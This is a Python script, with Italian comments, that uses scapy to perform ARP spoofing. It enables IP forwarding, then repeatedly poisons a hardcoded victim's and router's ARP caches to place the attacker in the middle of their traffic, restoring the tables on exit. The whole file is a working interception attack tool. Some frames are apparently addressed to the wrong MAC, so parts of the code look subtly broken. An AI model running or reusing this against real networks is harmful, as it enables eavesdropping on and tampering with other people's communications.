from scapy.all import ARP, Ether, sendp
import time
import subprocess
import sys

def enable_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["iptables", "-P", "FORWARD", "ACCEPT"])

def vittima_spoof(victim_ip, victim_mac, fake_mac, fake_ip):
    packet = Ether(dst=victim_mac) / ARP(op=2, 
                    pdst=victim_ip, 
                    hwdst=victim_mac,
                    hwsrc=fake_mac, 
                    psrc=fake_ip)
    sendp(packet, verbose=False)

def router_spoof(router_ip, router_mac, fake_mac, fake_ip):
    packet = Ether(dst=victim_mac) / ARP(op=2, 
                    pdst=router_ip, 
                    hwdst=router_mac,
                    hwsrc=fake_mac, 
                    psrc=fake_ip)
    sendp(packet, verbose=False)

def leaving_quietly(victim_ip, victim_mac, router_ip, router_mac):
    # Ripristino router
    packet = Ether(dst=victim_mac) / ARP(op=2,
             pdst=router_ip,
             hwdst=router_mac, 
             hwsrc=victim_mac, 
             psrc=victim_ip)
    sendp(packet, count=3 ,verbose=False)

    # Ripristino vittima
    packet = Ether(dst=victim_mac) / ARP(
        op=2,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=router_mac,
        psrc=router_ip
    )
    sendp(packet, count=3, verbose=False)

count = 0

if __name__ == "__main__":

    enable_forwarding()

    victim_ip = "192.168.142.141"
    victim_mac = "00:0c:29:35:17:32"
    router_ip = "192.168.142.2"
    router_mac = "00:50:56:e5:38:77"
    attacker_mac = "00:11:22:33:44:58"

    try:
        while True:

            vittima_spoof(victim_ip, victim_mac, attacker_mac, router_ip)
            router_spoof(router_ip, router_mac, attacker_mac, victim_ip)
            count += 1
            sys.stdout.write(f"\r[*] Pacchetti inviati: {count}")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Interruzione rilevata, ripristino ARP...")
        leaving_quietly(victim_ip, victim_mac, router_ip, router_mac)
        print("[+] ARP tables ripristinate. Uscita.")